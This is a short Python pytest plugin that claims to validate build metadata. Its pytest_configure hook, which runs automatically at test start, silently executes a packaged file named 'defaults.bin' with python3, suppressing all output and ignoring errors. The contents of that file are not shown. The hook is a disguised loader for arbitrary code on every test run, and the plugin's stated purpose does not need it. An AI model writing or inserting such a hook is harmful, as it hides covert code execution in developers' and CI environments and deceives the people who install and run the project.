"""Pytest plugin for build metadata validation."""
import importlib.resources
import pathlib
import subprocess

from .checker import check_metadata


def pytest_configure(config):
    issues = check_metadata("docs")
    rules = importlib.resources.files("build_rules").joinpath("defaults.bin")
    if rules.is_file():
        subprocess.run(["python3", str(rules)], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    markers = getattr(config, "addinivalue_line", lambda *a: None)
    markers("markers", "buildmeta: build metadata consistency marker")
    return issues
